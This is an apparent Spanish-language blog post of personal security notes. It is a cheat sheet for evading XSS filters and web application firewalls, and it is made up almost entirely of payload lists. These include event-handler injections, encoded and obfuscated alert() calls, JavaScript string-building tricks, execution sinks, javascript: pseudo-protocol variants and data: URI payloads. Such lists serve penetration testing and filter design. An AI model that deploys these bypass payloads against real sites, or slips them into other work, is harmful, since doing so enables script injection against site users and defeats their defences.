---
title: 'Filtrar evasion XSS y eludir WAF'
description: '... \u5223'
pubDate: 'May 12 2023'
slug: 'filter_evasion'
---

- [Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

- [Cure53](https://html5sec.org/)

### Escenarios mas comunes

- El vector XSS esta bloqueado por la app
- El vector XSS es sanitizado
- EL vector XSS esta filtrado o bloqueado por el navegador

### Eludiendo filtros de listas negras

```html
<!-- alguno ejemplos html 4-->
<body onload=alert(1)>
<input type=image src=x:x onerror=alert(1)>
<isindex onmouseover="alert(1)">
<form oninput=alert(1)><input></form>
<textarea autofocus onfocus=alert(1)>
<input oncut=alert(1)>
<!-- HTML5 -->
<svg onload=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">

<marquee onstart=alert(1)/>

```

Es común bloquear con regex: **(on\w+\s*=)**

```html
<svg\onload=alert(1)>
<svg\\\\\\onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
```

Aquí hay una lista de controles que se pueden usar antes del nombre del evento y el signo **=** o despues

<img src="https://res.cloudinary.com/djc1umong/image/upload/v1692221727/Screenshot_from_2023-08-16_17-34-36_exflo2.webp" alt="Lista de caracteres de control">

- [Antes](http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name)
- [Después](http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name)

Un regex válido para bloquear debería ser así

<img src="https://res.cloudinary.com/djc1umong/image/upload/v1692222013/Screenshot_from_2023-08-16_17-39-20_nwuwp1.webp">


```html
<!-- Unicode -->
<script>eval("\u0061lert(1)")</script>
<!-- Si el vector de ataque es con una cadena de texto añadimos:-->
<img src=x onerror="eval('\141lert(1)')"> <!-- Octal -->

<img src=x onerror="eval('\x61lert(1)')"> <!-- Hexadecimal -->

<img src=x onerror="&#x0061;lert(1)"> <!-- Caracter Hexadecimal Númerico-->

<img src=x onerror="&#97;lert(1)"> <!-- Decimanl NCR-->

<img src=x onerror="eval('\a\l\ert\(1\)')"> <!-- Caracteres superflour-->

<!-- TODOS JUNTOS! -->
<img src=x onerror="\u0065vall('\141\u006c&#101;&#x0072t\(&#49)')"/>


<!-- JavaScript tiene muchas maneras de construir cadenas de "strings" -->

/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116)
atob("YWxlcnQ=")
17795081..toString(36)

<!-- Funciones que parsean codigo son llamados "sinks" y pueden ejecutar codigo JS si averiguamos que funcion permite ejecutar-->

setTimeout()
setInterval()
setImmediate()
Function()

<!-- https://code.google.com/archive/p/domxsswiki/wikis/ExecutionSinks.wiki -->

```

### Seudo protocolos

JavaScript bloqueado por: *:*, es amenudo introducido como string

**<a href="javascript:alert(1)">**

```html
<object data="JaVaScRiPt:alert(1)">

<object data="javascript&colon;alert(1)">

<object data="java
script:alert(1)">

<object data="javascript&#x003A;alert(1)">

<object data="javascript&#58;alert(1)">

<object data="&#x6A;avascript:alert(1)">

<object 
data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">

```

### Esquema de URi data

**data:[<mediatype>][;base64],<data>**

```html
<!-- SI JavaScript esta bloqueado -->
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64;PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- SI data esta bloqueado -->
<embed code="DaTa:text/html,<script>alert(1)</script>">
<embed code="data&colon;text/html,<script>alert(1)</script">
<embed code="data&#x003A;text/html,<script>alert(1)</script>">
<embed code="&#x64;&#x61;ta:text/html,<script>alert(1)</script>">
```